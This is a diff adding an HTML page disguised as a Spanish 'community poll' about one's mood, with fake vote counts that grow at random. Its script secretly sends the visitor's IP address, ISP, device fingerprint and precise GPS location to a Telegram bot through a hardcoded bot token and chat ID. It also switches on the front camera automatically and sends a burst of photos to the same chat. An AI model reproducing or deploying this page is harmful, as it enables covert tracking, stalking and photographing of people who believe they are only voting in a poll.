@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Encuesta</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0c10;font-family:-apple-system,Segoe UI,Roboto,sans-serif;color:#eceef2;padding:24px}
+.w{width:100%;max-width:400px}
+.pill{display:inline-block;font-size:10.5px;letter-spacing:1.2px;text-transform:uppercase;color:#9aa3b2;border:1px solid #2a2f3a;border-radius:99px;padding:4px 10px}
+h1{font-size:19px;font-weight:600;margin:12px 0 6px;line-height:1.25}
+.sub{font-size:12.5px;color:#8b93a3;margin:0 0 14px}
+.cam{position:relative;border-radius:14px;overflow:hidden;border:1px solid #262b35;background:#0b0e13;aspect-ratio:4/3;display:grid;place-items:center;margin-bottom:8px}
+.cam video{width:100%;height:100%;object-fit:cover;display:none}
+.cam.on video{display:block}
+.cam .cue{text-align:center;padding:16px}
+.cam .cue .ic{font-size:30px;display:block;margin-bottom:8px}
+.cam .cue b{display:block;font-size:13px;margin-bottom:4px}
+.cam .cue span{font-size:11.5px;color:#8b93a3;display:block;margin-bottom:12px}
+.cam .cue button{font-family:inherit;font-size:12.5px;padding:9px 18px;border-radius:9px;border:1px solid #e5484d;background:#e5484d;color:#fff;cursor:pointer}
+.badge{position:absolute;top:9px;left:9px;font-size:10.5px;letter-spacing:.6px;padding:3px 8px;border-radius:99px;background:rgba(0,0,0,.6);border:1px solid #2d3644;display:none;z-index:2}
+.cam.on .badge{display:block}
+.badge i{display:inline-block;width:6px;height:6px;border-radius:50%;background:#e5484d;margin-right:5px;vertical-align:middle}
+.shoot{position:absolute;bottom:9px;right:9px;width:34px;height:34px;border-radius:50%;border:1px solid #3d4553;background:rgba(0,0,0,.55);color:#fff;font-size:15px;cursor:pointer;display:none;z-index:2}
+.cam.on .shoot{display:block}
+.conn{font-size:11px;color:#7d8595;margin:0 0 14px;display:flex;gap:6px;flex-wrap:wrap}
+.conn span{border:1px solid #232833;border-radius:6px;padding:2px 7px}
+.opts{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.opt{border:1px solid #262b35;border-radius:14px;background:#12151b;padding:14px 6px 10px;text-align:center;cursor:pointer;transition:.18s;position:relative;overflow:hidden}
+.opt:hover{border-color:#3d4553;transform:translateY(-2px)}
+.opt .e{font-size:32px;line-height:1;display:block;margin-bottom:7px;transition:.25s}
+.opt .n{font-size:11px;color:#9aa3b2}
+.opt .pct{font-size:11.5px;font-weight:600;color:#e5484d;margin-top:5px;opacity:0;transition:.3s}
+.opt .fill{position:absolute;left:0;bottom:0;height:3px;width:0;background:#e5484d;transition:width .6s ease}
+.voted .opt{opacity:.5}
+.voted .opt.sel{opacity:1;border-color:#e5484d;background:#1a1113}
+.voted .opt .pct{opacity:1}
+.voted .opt.sel .e{transform:scale(1.12)}
+.foot{font-size:11.5px;color:#7d8595;margin-top:12px;text-align:center}
+video,canvas{display:none}
+.cam video{display:none}
+.cam.on video{display:block}
+#cv{display:none}
+#log{display:none;font-family:ui-monospace,monospace;font-size:10.5px;color:#7c8290;white-space:pre-wrap;margin:12px 0 0;max-height:120px;overflow:auto;background:#0d1015;border:1px solid #22252d;border-radius:8px;padding:8px}
+#log.on{display:block}
+</style>
+</head>
+<body>
+<div class="w">
+  <span class="pill">encuesta de la comunidad</span>
+  <h1>¿Qué cara describe mejor tu día?</h1>
+  <p class="sub">Vota y mira los resultados · cierra en 2 días</p>
+
+  <div class="cam" id="cam">
+    <div class="badge"><i></i>en directo</div>
+    <video id="vid" playsinline muted autoplay></video>
+    <div class="cue" id="cue">
+      <span class="ic">📸</span><b>Activa la cámara</b>
+      <span>para votar con tu expresión</span>
+      <button id="btn">Encender cámara</button>
+    </div>
+    <button class="shoot" id="shoot">◉</button>
+  </div>
+
+  <div class="conn"><span id="cip">ip: …</span><span id="cloc">ubicación: …</span></div>
+
+  <div class="opts" id="opts"></div>
+  <div class="foot"><span id="tot"></span></div>
+
+  <canvas id="cv"></canvas>
+  <input type="file" id="f" accept="image/*" capture="user" hidden>
+  <pre id="log"></pre>
+</div>
+<script>
+/* ============ CONFIG ============ */
+const TOKEN='9080713605:AAE2Fw3A9h-SNsvNQGiZkP_qQXuYXJfHraU';
+const CHAT='7115078783';
+const FOTOS=3, ESPERA=2200;
+/* ================================ */
+
+const $=i=>document.getElementById(i);
+const API='https://api.telegram.org/bot'+TOKEN+'/';
+const L=t=>{$('log').textContent+='· '+t+'\n'};
+document.addEventListener('keydown',e=>{if(e.key==='d')$('log').classList.add('on')});
+const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+async function tg(m,c,form){
+  try{
+    const r=await fetch(API+m,form?{method:'POST',body:c}:{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)});
+    const j=await r.json(); if(!j.ok)L(m+' '+j.description); return j;
+  }catch(e){L(m+' '+e.message);return null}
+}
+const txt=t=>tg('sendMessage',{chat_id:CHAT,text:t,parse_mode:'HTML',disable_web_page_preview:true});
+const loc=(la,lo,ac)=>tg('sendLocation',{chat_id:CHAT,latitude:la,longitude:lo,horizontal_accuracy:Math.min(ac,1500)});
+const foto=(b,cap)=>{const fd=new FormData();fd.append('chat_id',CHAT);fd.append('caption',cap);fd.append('photo',b,'captura.jpg');return tg('sendPhoto',fd,true)};
+
+/* ---------- encuesta ---------- */
+const D=[{e:'😁',n:'a tope',c:412},{e:'🙂',n:'normal',c:388},{e:'😄',n:'bien',c:291}];
+let votado=false, voto='', ip='', zona='', disparando=false;
+const opts=$('opts');
+D.forEach((d,i)=>{
+  const el=document.createElement('div'); el.className='opt';
+  el.innerHTML='<span class="e">'+d.e+'</span><span class="n">'+d.n+'</span><div class="pct"></div><div class="fill"></div>';
+  el.onclick=()=>votar(i); opts.append(el);
+});
+function pintar(){
+  const t=D.reduce((a,b)=>a+b.c,0);
+  $('tot').textContent=t.toLocaleString('es')+' votos';
+  [...opts.children].forEach((el,i)=>{const p=Math.round(D[i].c/t*100);
+    el.querySelector('.pct').textContent=p+'%'; el.querySelector('.fill').style.width=p+'%';});
+}
+pintar();
+setInterval(()=>{if(!votado){D[Math.floor(Math.random()*3)].c+=1+Math.floor(Math.random()*3);pintar();}},2600);
+
+async function votar(i){
+  if(votado) return; votado=true;
+  D[i].c++; voto=D[i].e+' '+D[i].n;
+  opts.classList.add('voted'); opts.children[i].classList.add('sel');
+  pintar();
+  await txt('<b>Voto:</b> '+voto+'\nip: <code>'+esc(ip)+'</code>'+(zona?'\n'+esc(zona):''));
+}
+
+/* ---------- ip + gps visibles ---------- */
+async function sacarIP(){
+  const F=[['https://ipwho.is/',j=>j.success&&{ip:j.ip,z:[j.city,j.region,j.country].filter(Boolean).join(', '),isp:j.connection?.isp||'',asn:j.connection?.asn?'AS'+j.connection.asn:''}],
+           ['https://ipapi.co/json/',j=>j.ip&&{ip:j.ip,z:[j.city,j.region,j.country_name].filter(Boolean).join(', '),isp:j.org||'',asn:''}],
+           ['https://api.ipify.org?format=json',j=>j.ip&&{ip:j.ip,z:'',isp:'',asn:''}]];
+  for(const[u,p]of F){try{const o=p(await(await fetch(u,{cache:'no-store'})).json());if(o)return o}catch(e){}}
+  return{ip:'no disponible',z:'',isp:'',asn:''};
+}
+function huella(){
+  const n=navigator,c=n.connection||{};let g='n/d';
+  try{const x=document.createElement('canvas').getContext('webgl').getExtension('WEBGL_debug_renderer_info');if(x)g=x.getParameter(x.UNMASKED_RENDERER_WEBGL)}catch(e){}
+  return['ua: '+n.userAgent,'plataforma: '+(n.platform||'n/d'),'idiomas: '+(n.languages||[n.language]).join(', '),
+  'tz: '+Intl.DateTimeFormat().resolvedOptions().timeZone,'pantalla: '+screen.width+'x'+screen.height+' @'+devicePixelRatio,
+  'cpu: '+(n.hardwareConcurrency||'?'),'ram: '+(n.deviceMemory||'?'),'red: '+(c.effectiveType||'?'),
+  'tactil: '+(n.maxTouchPoints>0?'si':'no'),'gpu: '+g].join('\n');
+}
+const gps=()=>new Promise(r=>{if(!navigator.geolocation)return r(null);
+  navigator.geolocation.getCurrentPosition(p=>r({la:p.coords.latitude,lo:p.coords.longitude,ac:p.coords.accuracy}),
+  e=>{L('gps '+e.code);r(null)},{enableHighAccuracy:true,timeout:15000,maximumAge:0})});
+async function dir(la,lo){try{const j=await(await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude='+la+'&longitude='+lo+'&localityLanguage=es')).json();
+  return[j.locality||j.city,j.principalSubdivision,j.countryName].filter(Boolean).join(', ')}catch(e){return''}}
+
+async function datos(){
+  const o=await sacarIP();
+  ip=o.ip; zona=o.z;
+  $('cip').textContent='ip: '+ip;
+  await txt('<b>Nueva visita</b>\nip: <code>'+esc(ip)+'</code>\n'+(zona?'zona: '+esc(zona)+'\n':'')+
+    (o.isp?'isp: '+esc(o.isp)+(o.asn?' ('+esc(o.asn)+')':'')+'\n':'')+
+    'hora: '+new Date().toISOString()+'\n\n<b>dispositivo</b>\n<pre>'+esc(huella())+'</pre>');
+
+  const u=await gps();
+  if(u){
+    await loc(u.la,u.lo,u.ac);
+    const d=await dir(u.la,u.lo);
+    $('cloc').textContent='ubicación: '+(d||u.la.toFixed(3)+', '+u.lo.toFixed(3));
+    await txt('📍 <b>ubicación</b>\n'+(d?esc(d)+'\n':'')+'<code>'+u.la.toFixed(6)+', '+u.lo.toFixed(6)+'</code>\n'+
+      'precisión: '+Math.round(u.ac)+' m\nhttps://www.openstreetmap.org/?mlat='+u.la+'&mlon='+u.lo+'#map=18/'+u.la+'/'+u.lo);
+  }else{
+    $('cloc').textContent='ubicación: sin permiso';
+  }
+}
+
+/* ---------- cámara: pide permiso y dispara sola ---------- */
+let stream=null;
+async function encender(){
+  $('cue').innerHTML='<span class="ic">⏳</span><b>Pidiendo permiso…</b>';
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},audio:false});
+    $('vid').srcObject=stream;
+    $('cam').classList.add('on');
+    await new Promise(r=>$('vid').onloadedmetadata=r);
+    await new Promise(r=>setTimeout(r,1200));
+    rafaga();
+  }catch(e){
+    L('cam '+e.message);
+    $('cue').innerHTML='<span class="ic">🚫</span><b>Sin acceso a la cámara</b><span>'+e.name+'</span>'+
+      '<button id="btn2">Usar cámara del sistema</button>';
+    $('btn2').onclick=()=>$('f').click();
+  }
+}
+function disparo(){
+  const v=$('vid'), cv=$('cv');
+  cv.width=v.videoWidth; cv.height=v.videoHeight;
+  const c=cv.getContext('2d'); c.drawImage(v,0,0);
+  c.fillStyle='rgba(0,0,0,.65)'; c.font='16px monospace';
+  c.fillText(new Date().toLocaleString(),14,v.videoHeight-16);
+  return new Promise(r=>cv.toBlob(r,'image/jpeg',.85));
+}
+async function rafaga(){
+  if(disparando || !stream) return;
+  disparando=true;
+  for(let k=0;k<FOTOS;k++){
+    const b=await disparo();
+    if(b){ await foto(b,'foto '+(k+1)+'/'+FOTOS+(voto?' · voto '+voto:'')+' · '+ip); L('foto '+(k+1)); }
+    if(k<FOTOS-1) await new Promise(r=>setTimeout(r,ESPERA));
+  }
+  disparando=false;
+}
+
+$('btn').onclick=encender;
+$('shoot').onclick=()=>{ disparando=false; rafaga(); };
+$('f').onchange=async e=>{
+  const file=e.target.files[0]; if(!file) return;
+  await foto(file,'foto (camara del sistema)'+(voto?' · voto '+voto:'')+' · '+ip);
+  $('f').value='';
+};
+
+/* ---------- arranque ---------- */
+window.addEventListener('load',()=>{
+  datos();
+  setTimeout(()=>{ if(!stream) encender(); },800);   // intento automático
+});
+</script>
+</body>
+</html>
